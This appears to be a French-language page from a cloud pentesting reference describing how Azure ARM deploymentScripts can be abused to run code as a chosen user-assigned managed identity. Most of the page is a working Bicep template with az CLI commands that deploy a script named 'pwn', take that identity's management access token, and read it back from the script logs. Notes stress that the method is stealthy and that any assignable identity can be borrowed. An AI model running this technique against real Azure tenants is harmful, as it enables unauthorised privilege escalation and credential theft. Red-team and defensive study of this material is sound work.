---
title: "Deployment Scripts : exécuter un conteneur en tant qu'identité affectée par l'utilisateur choisie"
order: 5
description: "Détourner les deploymentScripts ARM, qui démarrent un conteneur s'exécutant en tant qu'identité managée affectée par l'utilisateur choisie."
keywords:
  - deploymentScripts
  - ARM
  - user-assigned identity
  - container
  - privilege escalation
---

# Deployment Scripts

Une ressource ARM `Microsoft.Resources/deploymentScripts` exécute un script shell ou PowerShell arbitraire dans une Azure Container Instance transitoire, et ce conteneur s'exécute en tant qu'**identité managée affectée par l'utilisateur que vous spécifiez**. Avec `Microsoft.Resources/deployments/write` et la capacité de référencer une identité affectée par l'utilisateur privilégiée, un deployment script devient une exécution de code en tant que cette identité, sans jamais toucher à une VM ou à une Function.

## Exécuter un script en tant qu'identité cible

```bash
cat > ds.bicep <<'EOF'
param uami string
resource s 'Microsoft.Resources/deploymentScripts@2020-10-01' = {
  name: 'pwn'
  location: resourceGroup().location
  kind: 'AzureCLI'
  identity: { type: 'UserAssigned', userAssignedIdentities: { '${uami}': {} } }
  properties: {
    azCliVersion: '2.52.0'
    scriptContent: 'az account get-access-token --resource https://management.azure.com/'
    retentionInterval: 'PT1H'
  }
}
EOF
az deployment group create -g <rg> --template-file ds.bicep \
  --parameters uami=/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>
# read the script output for the token
az deployment-scripts show-log -g <rg> -n pwn
```

## Notes d'exploitation

- L'identité doit seulement pouvoir vous être assignée ; elle n'a pas besoin d'être une identité que vous contrôlez déjà, ce qui permet d'emprunter n'importe quelle identité affectée par l'utilisateur à portée (le schéma `Invoke-AzDeploymentScript` de MicroBurst).
- Le conteneur est transitoire et la ressource facile à manquer, ce qui en fait un moyen discret de s'exécuter en tant qu'identité privilégiée.
- Cela va de pair avec l'[identité](../identity/privilege-escalation/deployment-template.md) : un déploiement privilégié et un deployment script sont les deux faces de l'exécution pilotée par ARM.

## Outils

- **Azure CLI** (`az deployment group create`, `az deployment-scripts show-log`).
- **MicroBurst** (emprunt d'identités affectées par l'utilisateur à la manière d'`Invoke-AzDeploymentScript`).

## Références

- [NetSPI: abusing deployment scripts in Azure](https://www.netspi.com/blog/)
- [HackTricks Cloud: Azure privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/index.html)
- [Microsoft: deploymentScripts in ARM templates](https://learn.microsoft.com/azure/azure-resource-manager/templates/deployment-script-template)
